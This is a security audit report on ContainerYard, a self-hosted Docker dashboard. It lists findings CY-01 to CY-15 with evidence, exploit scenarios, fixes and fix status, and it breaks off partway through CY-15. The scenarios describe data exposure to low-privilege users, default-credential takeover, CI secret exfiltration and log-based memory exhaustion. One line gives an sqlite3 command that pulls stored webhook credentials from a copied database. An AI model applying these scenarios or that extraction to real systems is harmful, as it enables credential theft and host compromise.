# Security Audit — ContainerYard — 2026-11-28

## 1. Executive summary

**Overall risk: Moderate → Low after this PR.** No critical or high findings. ContainerYard already had strong
controls: session regeneration, CSRF tokens, timing-safe compares, SSRF-guarded webhooks, a read-only non-root
container, and Express 5 routing that kept every guard. The real issues were data exposure to the non-admin
(VIEWER) role: notification channel secrets, and container command lines including the bundled Redis password.
Next were an unclamped log tail, the public `.env.example` placeholders passing startup checks, an auth-bypass
flag with no production guard, and gaps in auditing and retention. 21 of the 27 medium/low findings are fixed
(9 of them partially); 4 need a decision and 2 need a manual action.

| Severity | Confirmed | Fixed | Deferred (decision) | Manual action | Open (info, recommendation) |
|---|---|---|---|---|---|
| Critical | 0 | 0 | 0 | 0 | 0 |
| High | 0 | 0 | 0 | 0 | 0 |
| Medium | 4 | 4 | 0 | 0 | 0 |
| Low | 23 | 17 | 4 | 2 | 0 |
| Info | 26 | 4 | 0 | 0 | 22 |

Raw swarm findings: 70 → 55 after deduplication (2 rejected as false positives, 1 added by the verifier).

**Top 3 risks (all fixed here):**
1. **CY-02 / CY-03:** any signed-in VIEWER could read alert webhook credentials and container command arguments,
   including the bundled Redis `--requirepass`, the password of the session store.
2. **CY-04 / CY-07:** an unedited `.env.example` booted with a publicly known ADMIN password, and `AUTH_DISABLED` /
   `VITE_AUTH_DISABLED` turned every request into ADMIN even in production. ADMIN controls the host's Docker.
3. **CY-01:** `?tail=-1` made Docker return a container's entire log, which the server buffered in memory.

**Manual actions required:**
- **CY-11:** GitHub settings: create a `release` environment limited to v* tags, move DOCKERHUB_USERNAME/DOCKERHUB_TOKEN into it, add `environment: release` to the publish job, and use a Docker Hub token scoped to this one repository.
- **CY-26:** ROTATE REQUIRED: the historic PostgreSQL password is in public git history. Retire or rotate it wherever it may still be set, and check it is not reused anywhere.
- **Operators:** set `METRICS_TOKEN` in production (CY-05). After upgrading, the server warns at startup about plain-http
  PiDeck agent URLs; once the link is a private tunnel, set `CY_HOSTLOG_ALLOW_HTTP=true` (CY-15). `ADMIN_PASSWORD` can be removed
  from `.env` after first boot (CY-08). If the reverse proxy sits behind a CDN, confirm it restores the client IP (CY-16, DEPLOYMENT.md).

## 2. Scope & method

- **Audited commit:** `41e5e8b` on `main` (v6.0.0 plus a README commit). Fixes are on `security/audit-2026-11-28`.
- **In scope:** the whole repository (server, client, shared, Prisma schema, Dockerfile, compose files, scripts, CI workflows,
  docs). **Out of scope:** `node_modules/`, `dist/`, the live deployment and its proxy/CDN configuration.
- **Run type:** swarm. 8 parallel read-only auditors covered 13 layers (secrets, deps, authn, authz, injection, web, api,
  crypto, containers, infra, cicd, logging, logic). Then one fresh verifier that had not seen the swarm's reasoning
  deduplicated the findings, re-checked each one against the code (with throwaway probes where cheap) and examined gaps.
- **Skipped layer:** `llm`. The code has no LLM or agent features.
- **Tools:** gitleaks 8.30.1 (full history + tree), npm audit (npm 11), Trivy 0.76.2 (fs: vuln, misconfig, secret),
  hadolint (latest-alpine), actionlint 1.7.12, zizmor 1.33.1. **Unavailable:** semgrep, trufflehog, osv-scanner, checkov
  (manual review instead).
- **Limitations:** static review plus unit-level probes. No request was sent to a real Docker daemon or a production
  endpoint. Behaviour that depends on the reverse proxy, the CDN or the host firewall was judged from the repo's docs.

## 3. Architecture & trust boundaries

Express 5 API and React 19 SPA in one Node process. Prisma + SQLite for users, audit, bookmarks, saved searches and
monitoring tables. Redis for sessions. dockerode on the host Docker socket for the local host. cAdvisor (read-only
metrics) and optional PiDeck log agents (bearer token) for remote hosts. Runs in Docker Compose behind a TLS reverse
proxy; the port is published on 127.0.0.1 only.

```mermaid
flowchart LR
  B[Browser] -->|HTTPS| P[Reverse proxy / CDN]
  P -->|HTTP 127.0.0.1:5008| A[Express API + SPA]
  subgraph container[App container: non-root, read-only rootfs, cap_drop ALL]
    A
  end
  A -->|sessions| R[(Redis)]
  A -->|Prisma| D[(SQLite)]
  A -->|unix socket, root-equivalent| S[Docker Engine]
  A -->|HTTP GET| C[cAdvisor on remote hosts]
  A -->|HTTP + bearer token| G[PiDeck log agents]
  A -->|HTTPS POST, SSRF-guarded| W[Webhook receivers]
  F[Firebase Auth] -.->|ID token verified server-side| A
```

Untrusted input: HTTP requests, Host/Origin/X-Forwarded-* headers, container names, labels and log content, cAdvisor
and agent responses, Firebase ID tokens, admin-supplied webhook URLs. Privileged sinks: the Docker socket, host log
files, outbound HTTP, SQLite writes, session and role decisions, CSV exports and SSE streams.

## 4. Findings

Severity is the verified (final) severity. Original swarm IDs are listed under *Merged from*.

### [MEDIUM] CY-01 — Negative `tail` on container log snapshot is not clamped: VIEWER can make the server buffer the entire container log

- **Location:** `server/src/routes/hosts.ts:139-157`; `server/src/services/docker.ts:316-336`; `server/src/routes/hosts.ts:139-153`; `server/src/services/docker.ts:319-336`
- **CWE / OWASP:** CWE-770 / A04:2021 · **Confidence:** likely · **Layer:** api
- **Merged from:** API-002, INJECTION-002
- **Preconditions:** Authenticated VIEWER; a container with a large log.

**Evidence**

```
const tail = req.query.tail ? parseInt(String(req.query.tail), 10) : 500;
tail: Number.isNaN(tail) ? 500 : Math.min(tail, 5000),   // no lower bound
... tail: Math.min(tail, 5000), ... const raw = await container.logs(logOpts); let logs = demuxDockerLogs(raw);
--- merged evidence ---
[INJECTION-002] const tail = req.query.tail ? parseInt(String(req.query.tail), 10) : 500;
...
tail: Number.isNaN(tail) ? 500 : Math.min(tail, 5000),   // no lower bound
// docker.ts
tail: Math.min(tail, 5000),
const raw = await container.logs(logOpts);
let logs = demuxDockerLogs(raw);
```

**Exploit scenario.** 1) VIEWER requests GET /api/hosts/<host>/containers/<id>/logs?tail=-1. 2) Math.min(-1,5000) = -1 (probe: probes/clamp-probe.mjs). 3) dockerode sends tail=-1; the Docker daemon treats a negative tail as 'all lines'. 4) The whole json-file log (can be GBs for a chatty container) is buffered, demuxed and turned into one string in the Node process; a few parallel requests exhaust memory on a small host and crash the dashboard (and the alert worker with it). stacks.ts and hostLogs.ts clamp to >=1; this route does not.

**Fix.** Clamp with Math.min(Math.max(tail, 1), 5000) in hosts.ts and Math.max(1, ...) inside getContainerLogs.

**Status:** Fixed in f1967d5

### [MEDIUM] CY-02 — Notification channel secrets (webhook URL tokens, custom auth headers) readable by VIEWER via GET /api/alerts/channels[/:id]

- **Location:** `server/src/routes/alerts.ts:16-20`; `server/src/routes/alerts.ts:47-73`; `server/src/services/notifications.ts:43-55`; `server/src/routes/alerts.ts:16-20, 47-73`; `server/src/services/notifications.ts:15-22, 38-53`; `server/src/services/notifications.ts:15-22, 43-53`; `server/src/index.ts:/api/alerts mount: requireAuth only`; `server/src/routes/alerts.ts:15-19`; `server/src/services/notifications.ts:15-20, 43-53`; `server/prisma/schema.prisma:69-76`
- **CWE / OWASP:** CWE-200 / A01:2021 · **Confidence:** confirmed · **Layer:** authz
- **Merged from:** AUTHZ-001, API-001, SECRETS-001, WEB-001
- **Preconditions:** Valid VIEWER account; at least one notification channel with credentials in its config.

**Evidence**

```
// Reading alerts is open to any signed-in user; changing them needs ADMIN.
router.use((req, res, next) => {
  if (req.method === "GET" || req.method === "HEAD") return next();
  return requireRole("ADMIN")(req, res, next);
});
...
router.get("/channels", async (_req, res, next) => {
  const channels = await prisma.notificationChannel.findMany({ orderBy: { createdAt: "desc" } });
  res.json(channels);   // full row incl. `config` JSON

// notifications.ts: sendWebhookNotification uses config.url and stringHeaders(config.headers)
--- merged evidence ---
[API-001] router.use((req,res,next)=>{ if (req.method === "GET" || req.method === "HEAD") return next(); return requireRole("ADMIN")(...) });
router.get("/channels", ... const channels = await prisma.notificationChannel.findMany(...); res.json(channels);
// config is raw JSON: { url, headers, payload, to, subject }
[SECRETS-001] // Reading alerts is open to any signed-in user; changing them needs ADMIN.
router.use((req, res, next) => { if (req.method === "GET" || req.method === "HEAD") return next(); return requireRole("ADMIN")(req, res, next); });
...
router.get("/channels", ...) { const channels = await prisma.notificationChannel.findMany({ orderBy: { createdAt: "desc" } }); res.json(channels); }
// config holds { url, headers, payload } and headers are sent verbatim by postWebhook(url, body, stringHeaders(config.headers))
[WEB-001] router.use((req,res,next)=>{ if (req.method === "GET" || req.method === "HEAD") return next(); return requireRole("ADMIN")(req,res,next); });
...
router.get("/channels", ... const channels = await prisma.notificationChannel.findMany({ orderBy: { createdAt: "desc" } }); res.json(channels);
```

**Exploit scenario.** 1. An admin creates a webhook channel whose config is {"url":"https://hooks.example/services/T000/B000/<token>","headers":{"Authorization":"Bearer <api-token>"}}. 2. A low-privileged VIEWER (or a Google-allowlisted read-only user) signs in and calls GET /api/alerts/channels (or /api/alerts/channels/:id). 3. The response contains the raw `config` string with the webhook URL token and the Authorization header value. 4. The VIEWER can now post forged alerts into the team's chat/incident tool or use the bearer token against the third-party API, outside ContainerYard's RBAC and audit log.

**Fix.** Return config to non-ADMIN with url reduced to scheme+host and all header values masked (or require ADMIN for GET /channels*); keep full config for ADMIN only.

**Status:** Fixed in 4701762

### [MEDIUM] CY-03 — VIEWER receives container command line and host mount paths from GET /api/hosts/:hostId/containers/:containerId (inspect is ADMIN-only for the same data)

- **Location:** `server/src/routes/hosts.ts:76-96`; `server/src/services/docker.ts:212-237`; `server/src/routes/inspect.ts:41-56`; `docker-compose.yml:63-67`; `docker-compose.yml:63-66`; `server/src/services/docker.ts:231-236`; `server/src/routes/hosts.ts:76-84`; `server/src/lib/redact.ts:12-16`; `client/src/features/monitoring/StatsPanel.tsx:90`
- **CWE / OWASP:** CWE-200 / A01:2021 · **Confidence:** confirmed · **Layer:** authz
- **Merged from:** AUTHZ-002, CONTAINERS-001
- **Preconditions:** Valid VIEWER account; DOCKER provider host; secrets passed via container command or labels (true for the shipped compose file's redis).

**Evidence**

```
hosts.ts:
  const container = await getDockerContainerDetail(host, containerId);
  // Env values are credentials more often than not: admins only.
  return res.json({ ...container, env: envForRole(container.env, req.session.user?.role) });

docker.ts getContainerDetail returns:
  labels, ...
  command: commandString(inspect.Config?.Cmd),
  env: normalizeEnv(...),
  mounts: normalizeMounts(inspect.Mounts),

inspect.ts: "returns dockerode inspect JSON (admins only: it contains the container's environment, command line and mounts)"

docker-compose.yml (bundled redis):
    command:
      - redis-server
      - --requirepass
      - ${REDIS_PASSWORD:?...}
--- merged evidence ---
[CONTAINERS-001] docker-compose.yml: command: [redis-server, --requirepass, ${REDIS_PASSWORD:?...}, ...]
services/docker.ts getContainerDetail(): return { ...summary, command: commandString(inspect.Config?.Cmd), env: normalizeEnv(...), mounts: normalizeMounts(inspect.Mounts), ... }
routes/hosts.ts: // Env values are credentials more often than not: admins only.
  return res.json({ ...container, env: envForRole(container.env, req.session.user?.role) });
(only env is redacted; command and mounts are passed through for every authenticated role)
```

**Exploit scenario.** 1. VIEWER signs in. 2. GET /api/hosts/<host>/containers lists all containers including the bundled redis session store. 3. GET /api/hosts/<host>/containers/<redis-id> returns command: "redis-server --requirepass <REDIS_PASSWORD> --appendonly ..." in clear text; env is redacted but the command line is not. Any other container started with secrets as CLI flags (DB passwords, --token=..., basic-auth hashes in Traefik labels) leaks the same way, plus host mount source paths. 4. The redis password protects the session store; anyone who later reaches the internal network (or a sibling container) can read/forge sessions, including ADMIN sessions.

**Fix.** In hosts.ts apply a role filter to command (null or argv with values after the first token masked) and mount sources for non-ADMIN, mirroring envForRole.

**Status:** Fixed in 1f7c880

### [MEDIUM] CY-04 — .env.example placeholder secrets pass all startup validation (bootstrap ADMIN password, SESSION_SECRET, REDIS_PASSWORD)

- **Location:** `.env.example:7, 11, 41-42`; `server/src/config/env.ts:13, 23-24`; `docker/entrypoint.sh:36-42`; `server/prisma/seed.js:23-36`; `.env.example:8, 12, 38-39`; `server/src/config/env.ts:13, 24`; `server/prisma/seed.js:16-36`
- **CWE / OWASP:** CWE-1188 / A07:2021 · **Confidence:** confirmed · **Layer:** infra
- **Merged from:** INFRA-003, SECRETS-002
- **Preconditions:** Operator keeps the example placeholders; instance reachable through the reverse proxy.

**Evidence**

```
.env.example: SESSION_SECRET=chan****hars (49 chars)
REDIS_PASSWORD=chan****word
ADMIN_EMAIL=admin@example.com
ADMIN_PASSWORD=chan****ease (16 chars)
env.ts: SESSION_SECRET: z.string().min(32), ADMIN_PASSWORD: z.string().min(12)
entrypoint.sh: if [ "${#ADMIN_PASSWORD}" -lt 12 ]; then fail ...  (length only)
--- merged evidence ---
[SECRETS-002] .env.example:  SESSION_SECRET=chan****hars   (50 chars)
               ADMIN_PASSWORD=chan****ease   (16 chars)
env.ts:        SESSION_SECRET: z.string().min(32), ... ADMIN_PASSWORD: z.string().min(12),
entrypoint.sh: if [ "${#SESSION_SECRET}" -lt 32 ] ... if [ "${#ADMIN_PASSWORD}" -lt 12 ] ...   (length checks only)
seed.js:       creates role ADMIN with bcrypt(ADMIN_PASSWORD) when the User table is empty; no forced password change
```

**Exploit scenario.** The documented quick start is `cp .env.example .env && nano .env && docker compose up -d`. If the operator edits only ALLOWED_ORIGINS (the one value that visibly breaks login), every check passes and seed.js creates ADMIN admin@example.com / chan****ease on first boot. 1. Attacker who finds the instance (TLS certs are in CT logs, the product name is on the login page) logs in at /api/auth/login with the published credentials (well within the 10-attempt limit). 2. As ADMIN they can stop/remove any container on the host via the Docker socket and read host logs; with the published SESSION_SECRET they can also sign arbitrary session-id cookies. This is the classic default-credential path to host compromise.

**Fix.** Reject values that equal or start with the .env.example placeholders (e.g. /^change-me/i) for SESSION_SECRET, ADMIN_PASSWORD and REDIS_PASSWORD in env.ts and entrypoint.sh, with a clear startup error.

**Status:** Fixed in 1ccb85a

### [LOW] CY-05 — /metrics is public when METRICS_TOKEN is unset (the default)

- **Location:** `server/src/metrics.ts:20-30`; `server/src/config/env.ts:25`; `.env.example:57-58`
- **CWE / OWASP:** CWE-306 / A05:2021 · **Confidence:** confirmed · **Layer:** api
- **Merged from:** API-006, INFRA-007
- **Preconditions:** METRICS_TOKEN not configured (default in .env.example); proxy forwards /metrics.

**Evidence**

```
app.get("/metrics", async (req, res) => { if (env.METRICS_TOKEN) { ... } res.send(await register.metrics()); });
// .env.example: # METRICS_TOKEN=
--- merged evidence ---
[INFRA-007] app.get("/metrics", async (req, res) => {
  if (env.METRICS_TOKEN) { ...403... }
  res.send(await register.metrics());
# METRICS_TOKEN=
```

**Exploit scenario.** Anyone on the internet requests https://<site>/metrics and gets prom-client default metrics: exact Node.js version, heap/RSS, event-loop lag, open handles. That fingerprints the runtime for known-CVE targeting and gives a live view of memory pressure useful to time DoS attempts (API-002/003). No session or CSRF needed.

**Fix.** Require METRICS_TOKEN in production (or answer 404 when unset); this changes behaviour for existing tokenless scrapers.

**Status:** Deferred — needs decision: Requiring METRICS_TOKEN (or answering 404 without one) breaks existing tokenless Prometheus scrapers. Set METRICS_TOKEN in production now; make it mandatory in a major release.

### [LOW] CY-06 — Metrics summary/top/history/export endpoints materialise up to 365 days of rows per request

- **Location:** `server/src/routes/metrics.ts:49-64, 115-130, 160-175, 205-269`; `server/src/services/metricsAggregator.ts:160-200`
- **CWE / OWASP:** CWE-400 / A04:2021 · **Confidence:** likely · **Layer:** api
- **Merged from:** API-003
- **Preconditions:** Authenticated VIEWER; accumulated metrics history.

**Evidence**

```
const days = safeParseInt(req.query.days as string, 7, 365);
const metrics = await prisma.containerMetricsHourly.findMany({ where: { hostId, aggregatedAt: { gte: cutoffDate } } }); // no take, no select
... Math.max(...stats.maxCpu) ... csvRows = metrics.map(...).join('\n')
```

**Exploit scenario.** 1) After months of operation the ContainerMetricsHourly table holds containers*24*days rows (no retention job exists, see LOGGING-002); 50 containers for a year = ~438k rows. 2) A VIEWER loops GET /api/hosts/<host>/metrics/summary?days=365 (or export/csv?days=365) in parallel; each call loads every row as a Prisma object plus intermediate arrays/strings. 3) Only the global 10000 req/15 min limiter applies, so a handful of concurrent requests can push a Raspberry-Pi-class host into OOM.

**Fix.** Aggregate in the database (groupBy/aggregate) or select only needed columns with a hard row cap, and lower the max window to the 90 days the schema documents.

**Status:** Fixed in ca41a1c (partial: Window capped at 90 days. Database-side aggregation is a follow-up (section 8).)

### [LOW] CY-07 — AUTH_DISABLED / VITE_AUTH_DISABLED turns every anonymous request into ADMIN with no production guard

- **Location:** `server/src/middleware/auth.ts:21-22`; `server/src/middleware/auth.ts:80-92`; `server/src/config/env.ts:8-42`; `server/src/middleware/auth.ts:80-91`; `server/src/lib/sseGuard.ts:53`; `server/src/middleware/auth.ts:21-22, 80-91`; `client/src/components/AuthGate.tsx:7`
- **CWE / OWASP:** CWE-1188 / A05:2021 · **Confidence:** confirmed · **Layer:** authn
- **Merged from:** AUTHN-001, AUTHZ-003, INFRA-004
- **Verifier:** downgraded from medium — Code confirmed (auth.ts:21-22, 80-92; sseGuard.ts:53 also short-circuits any session whose user id is 'auth-disabled'). Downgraded: no shipped file (.env.example, compose, Dockerfile, ecosystem.config.cjs) or doc sets or mentions either flag, so exploitation needs an operator to set an undocumented variable. Impact if set is unauthenticated ADMIN, so a guard is cheap and worthwhile, but likelihood is low. The VITE_ alias is the real footgun: the Docker image's client is built at image build time, so setting VITE_AUTH_DISABLED in .env changes nothing in the UI but silently disables server auth.
- **Preconditions:** Either env var set to 'true' in the server environment. Operator misconfiguration, but the coupling to a client build variable makes it plausible.

**Evidence**

```
const AUTH_DISABLED =
  process.env.AUTH_DISABLED === "true" || process.env.VITE_AUTH_DISABLED === "true";
...
if (AUTH_DISABLED) {
  if (!req.session.user) {
    req.session.user = { id: "auth-disabled", email: env.ADMIN_EMAIL, role: "ADMIN", sessionVersion: 0 };
  }
  res.locals.sessionVerified = true;
  return true;
}
--- merged evidence ---
[AUTHZ-003] const AUTH_DISABLED =
  process.env.AUTH_DISABLED === "true" || process.env.VITE_AUTH_DISABLED === "true";
...
  if (AUTH_DISABLED) {
    if (!req.session.user) {
      req.session.user = { id: "auth-disabled", email: env.ADMIN_EMAIL, role: "ADMIN", sessionVersion: 0 };
    }
    res.locals.user = req.session.user;
    res.locals.sessionVerified = true;
    return true;
  }

sseGuard.ts: if (sessionUser.id === "auth-disabled") return true;   // regardless of the flag
[INFRA-004] const AUTH_DISABLED =
  process.env.AUTH_DISABLED === "true" || process.env.VITE_AUTH_DISABLED === "true";
...
if (AUTH_DISABLED) {
  if (!req.session.user) {
    req.session.user = { id: "auth-disabled", email: env.ADMIN_EMAIL, role: "ADMIN", sessionVersion: 0 };
  }
```

**Exploit scenario.** 1. Operator sets VITE_AUTH_DISABLED=true in the shared .env to build/try the client without login (it is a client build flag read by 6 client files), or copies AUTH_DISABLED=true from a dev setup. docker-compose.yml loads that same .env via env_file into the production container. 2. The server reads the client-named variable too, so server-side auth is silently disabled even though NODE_ENV=production. 3. An anonymous internet user GETs /api/auth/csrf to obtain a CSRF token for their own session, then calls any route (requireAuth/requireRole(ADMIN) both go through verifySessionUser) e.g. POST /api/hosts/<id>/containers/<id>/actions or /api/users to create an admin. 4. ADMIN controls the host Docker socket = root on the host. No startup warning is logged and the flag is not in env.ts, .env.example or DEPLOYMENT.md, so it is easy to miss.

**Fix.** Server honours only AUTH_DISABLED (drop the VITE_ alias), refuses to start when it is set with NODE_ENV=production, logs a loud warning otherwise, and sseGuard checks the flag instead of the magic user id.

**Status:** Fixed in f018583

### [LOW] CY-08 — Bootstrap ADMIN_PASSWORD must remain in the runtime environment forever and is never forced to change

- **Location:** `server/src/config/env.ts:24`; `server/prisma/seed.js:16-38`; `docker/entrypoint.sh:16-23`
- **CWE / OWASP:** CWE-256 / A07:2021 · **Confidence:** confirmed · **Layer:** authn
- **Merged from:** AUTHN-005
- **Preconditions:** Read access to .env / docker inspect / process env, and admin never changed the bootstrap password.

**Evidence**

```
ADMIN_PASSWORD: z.string().min(12),   // required at every server start
...
const userCount = await prisma.user.count();
if (userCount > 0) { console.log("Users already exist, skipping bootstrap admin creation"); return; }
const hashedPassword = await bcrypt.hash(adminPassword, 12);
```

**Exploit scenario.** Good: the seed only creates the admin when the User table is empty; it does not reset the password on boot and there is no hard-coded default. However env.ts and entrypoint.sh refuse to start without ADMIN_PASSWORD, so the plaintext bootstrap password must stay in the .env file and in the container environment for the life of the deployment, readable via `docker inspect`, /proc/1/environ inside the container, backups of .env, or any process-env disclosure bug. Nothing forces the admin to change it at first login, so in many installs this plaintext value is the live ADMIN credential. Anyone with read access to the compose directory or the docker group (or a future env-leak bug) gets admin and therefore host root. Minor: the seed does not apply the 72-byte bcrypt limit that validateNewPassword enforces elsewhere.

**Fix.** Make ADMIN_PASSWORD optional in env.ts/entrypoint.sh when the DB already has users, and document removing it after first boot.

**Status:** Fixed in 82b8c23 (partial: ADMIN_PASSWORD is optional after first boot. A forced first-login password change is a follow-up (section 8).)

### [LOW] CY-09 — Google sign-in maps to any local account (including ADMIN) by e-mail only, with no Firebase uid binding

- **Location:** `server/src/routes/auth.ts:155-184`; `server/src/services/firebaseAuth.ts:315-346`
- **CWE / OWASP:** CWE-287 / A07:2021 · **Confidence:** possible · **Layer:** authn
- **Merged from:** AUTHN-004
- **Preconditions:** Allowlisted address not under the operator's long-term control (non-gmail domain); Google sign-in enabled.

**Evidence**

```
const user = await prisma.user.findUnique({ where: { email: verified.email } });
...
req.session.user = { id: user.id, email: user.email, role: user.role, sessionVersion: user.sessionVersion, authMethod: "google" };
```

**Exploit scenario.** Token verification itself is sound (verifyIdToken with checkRevoked=true, audience = FIREBASE_PROJECT_ID, email_verified === true, sign_in_provider === 'google.com', allowlist normalised to lower case and re-checked on every request). But the only link between the Google identity and the local account is the e-mail string; the Firebase uid is returned and discarded. If an allowlisted address is on a custom domain (Google accounts can be created for any address after mailbox verification) and that mailbox or domain later changes hands (lapsed domain, recycled employee address, mail alias), the new holder creates a Google account for it, gets email_verified=true and signs in as the matching local user, which can be the bootstrap ADMIN (root-equivalent on the Docker host). Password login is not needed and the account's local password is bypassed.

**Fix.** Store the Firebase uid on first Google login and reject later logins whose uid differs (needs a schema column + migration).

**Status:** Deferred — needs decision: Needs a new User column (firebaseUid) and a migration, plus a policy for existing accounts.

### [LOW] CY-10 — Live log SSE streams survive logout and session expiry (heartbeat re-check ignores the session store)

- **Location:** `server/src/lib/sseGuard.ts:47-73`; `server/src/routes/hosts.ts:183-233`; `server/src/routes/hostLogs.ts:130-131, 273-281, 317-325, 408`; `server/src/routes/auth.ts:348-361`; `node_modules/express-session/session/session.js:destroy(): delete this.req.session; store.destroy(id)`
- **CWE / OWASP:** CWE-613 / A07:2021 · **Confidence:** confirmed · **Layer:** authn
- **Merged from:** —
- **Preconditions:** An already-open stream at logout/expiry time; the attacker needs access to that client or connection.

**Evidence**

```
sseGuard.ts isSseSessionValid(): const sessionUser = req.session?.user; ... dbUser = prisma.user.findUnique(...); if (dbUser.sessionVersion !== expectedVersion) return false; ... return true;  // never consults req.sessionStore
auth.ts logout: req.session.destroy(...)  // no sessionVersion bump
express-session Session.destroy(): delete this.req.session; this.req.sessionStore.destroy(this.id, fn)  // only the logout request's object + the Redis key
```

**Exploit scenario.** 1. A user (VIEWER for container logs, ADMIN for host logs) opens one or more live log streams, e.g. on a shared or kiosk machine. 2. They click Sign out: the Redis session is deleted and the cookie cleared. 3. The open SSE requests keep their own in-memory req.session; every 15 s heartbeat re-reads the user row, sees the same sessionVersion and role, and keeps streaming container/host log lines to that browser tab (or to anyone holding the socket). The same applies after the 7-day cookie/Redis TTL expires. Demotion and password change are handled (role/sessionVersion checked); logout and expiry are not.

**Fix.** Add a sessionStore.get(req.sessionID) existence check to isSseSessionValid and close the stream when it is gone.

**Status:** Fixed in 900a795

### [LOW] CY-11 — Docker Hub publish credentials are repository-level secrets with no protected environment

- **Location:** `.github/workflows/release.yml:97-105`; `.github/workflows/release.yml:216-220`; `.github/workflows/release.yml:242-248`
- **CWE / OWASP:** CWE-522 / A08:2021 · **Confidence:** confirmed · **Layer:** cicd
- **Merged from:** CICD-001
- **Verifier:** downgraded from medium — Verified read-only via GitHub API: DOCKERHUB_TOKEN/DOCKERHUB_USERNAME are repo secrets, 0 environments, release.yml publish job has no environment key, only a branch ruleset exists. Downgraded: exploitation requires a credential with write access to this repository (fork PRs and Dependabot PRs do not receive secrets); the gap is that such a credential then reaches the Hub token from any branch without review. Still worth fixing because a poisoned image runs with the Docker socket.
- **Preconditions:** Push access to any non-main branch (or a token with that access). Fork PRs do NOT get the secrets.

**Evidence**

```
publish:
    needs: [tag, test]
    runs-on: ubuntu-24.04
    permissions: ...   (no `environment:` key)
  ...
  password: ${{ secrets.DOCKERHUB_TOKEN }}

GitHub API (read-only): /actions/secrets -> DOCKERHUB_TOKEN, DOCKERHUB_USERNAME at repo level; /environments -> total_count 0; no tag ruleset (only protect-main on the default branch).
```

**Exploit scenario.** 1. An attacker obtains any credential that can push a branch to the repo (a collaborator account, a leaked PAT with repo+workflow scope, or an automation/bot token that opens PRs from branches in this repo). 2. They push a branch that edits .github/workflows/ci.yml (triggered on pull_request and push) or adds a new workflow, adding a step that sends ${{ secrets.DOCKERHUB_TOKEN }} to an external host. Same-repository pull_request runs and any push/workflow_dispatch run receive repository secrets; the protect-main ruleset does not apply to other branches. 3. With the Docker Hub token they push a backdoored 0xwulf/containeryard:latest. Every deployment that pulls :latest then runs attacker code with the Docker socket mounted, i.e. root on the host. The dockerhub-description step also needs a token with delete scope, so the token can likely delete or overwrite all tags.

**Fix.** Move both secrets into a `release` environment restricted to v* tags (required reviewer optional) and add `environment: release` to the publish job.

**Status:** Manual action: GitHub settings: create a `release` environment limited to v* tags, move DOCKERHUB_USERNAME/DOCKERHUB_TOKEN into it, add `environment: release` to the publish job, and use a Docker Hub token scoped to this one repository.

### [LOW] CY-12 — Release can publish any v* tag, including one on a commit that never passed main's PR rules

- **Location:** `.github/workflows/release.yml:16-21`; `.github/workflows/release.yml:53-88`
- **CWE / OWASP:** CWE-284 / A08:2021 · **Confidence:** confirmed · **Layer:** cicd
- **Merged from:** CICD-002
- **Preconditions:** Push access to the repo (single maintainer today, plus any automation tokens).

**Evidence**

```
on:
  push:
    tags: ['v*.*.*']
...
 if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]]; then ...
 pkg=$(jq -r .version package.json); if [ "v$pkg" != "$TAG" ] ...   (no check that the tagged commit is reachable from origin/main); rulesets: only protect-main (target branch).
```

**Exploit scenario.** A holder of push access tags a commit on an unreviewed side branch whose package.json version matches (e.g. v6.0.1) and pushes the tag. CI on the tag runs (attacker-controlled code passes its own tests), then the publish job pushes it as :6.0.1, :6.0 and :latest. This bypasses the PR requirement of the main ruleset. Combined with CICD-001 the same actor could exfiltrate the token anyway, so impact is limited to bypassing review.

**Fix.** In the tag job, fail unless `git merge-base --is-ancestor $GITHUB_SHA origin/main`; optionally add a tag ruleset (settings).

**Status:** Fixed in 72a61d6 (partial: Workflow check added. A tag ruleset is a settings follow-up (section 8).)

### [LOW] CY-13 — No memory / PID / CPU limits on app and redis services

- **Location:** `docker-compose.yml:15-59`; `docker-compose.yml:61-102`
- **CWE / OWASP:** CWE-770 / A05:2021 · **Confidence:** confirmed · **Layer:** containers
- **Merged from:** CONTAINERS-004
- **Preconditions:** Authenticated user, or a noisy container on the host.

**Evidence**

```
services.app and services.redis define read_only, cap_drop, security_opt, tmpfs and logging, but no mem_limit / pids_limit / cpus / deploy.resources.limits.
```

**Exploit scenario.** An authenticated user opens many SSE log streams (/api/hosts/:id/containers/:id/logs/stream) on chatty containers, or a container floods logs that the app buffers/demuxes; the Node process (unbounded heap up to V8 default) and Redis (no maxmemory) grow until the host kernel OOM-killer picks a victim, which may be an unrelated production service on the same host rather than ContainerYard. A fork-bomb style bug in spawned `tail` processes is also unbounded without pids_limit.

**Fix.** Add mem_limit, pids_limit and cpus to both services (overridable via env) and --maxmemory with an eviction-safe policy for redis.

**Status:** Fixed in b7caa8a

### [LOW] CY-14 — Notification channel credentials stored unencrypted in SQLite

- **Location:** `server/prisma/schema.prisma:model NotificationChannel (config String)`; `server/src/routes/alerts.ts:85-95, 120-136`
- **CWE / OWASP:** CWE-312 / A02:2021 · **Confidence:** confirmed · **Layer:** crypto
- **Merged from:** CRYPTO-002
- **Preconditions:** Attacker gets read access to the SQLite file or its backups, without access to the running app's environment.

**Evidence**

```
model NotificationChannel { ... type String  config String ... }
// routes write result.data.config (JSON with url/headers/payload) verbatim
```

**Exploit scenario.** 1. Attacker obtains a copy of /data/app.db (backup of the cy-data volume, leaked volume snapshot, or read access to the Docker volume directory). 2. `sqlite3 app.db 'select config from NotificationChannel'` yields webhook URLs and Authorization header values in clear text. 3. They abuse the third-party webhook/notification services. Impact is bounded: the same backup also contains bcrypt hashes only, and anyone with host-level access already has more.

**Fix.** Encrypt channel config at rest with a key from env (AES-GCM) and migrate existing rows.

**Status:** Deferred — needs decision: Encrypting channel config at rest needs a new key in the environment and a data migration of existing rows.

### [LOW] CY-15 — PiDeck agent bearer token (and cAdvisor traffic) allowed over plain HTTP; examples use http://

- **Location:** `server/src/config/remoteHosts.ts:14-33`; `server/src/services/hostLogs/pideckAgentProvider.ts:153-176`; `.env.example:CY_REMOTE_HOSTS example (logs.url http://10.0.0.10:5016)`; `server/src/config/remoteHosts.ts:14-20, 27-29`; `server/src/services/hostLogs/pideckAgentProvider.ts:168-176`; `.env.example:33-35`
- **CWE / OWASP:** CWE-319 / A02:2021 · **Confidence:** confirmed · **Layer:** crypto
- **Merged from:** CRYPTO-001, INFRA-006
- **Preconditions:** Agent reached over plain HTTP across a network the attacker can observe (no encrypted tunnel such as WireGuard in between).

**Evidence**

```
if (u.protocol !== "http:" && u.protocol !== "https:") return false;   // http accepted
...
res = await fetch(fullUrl.toString(), { method: "GET", headers: { Authorization: `Bearer ${token}`, ... } })
--- merged evidence ---
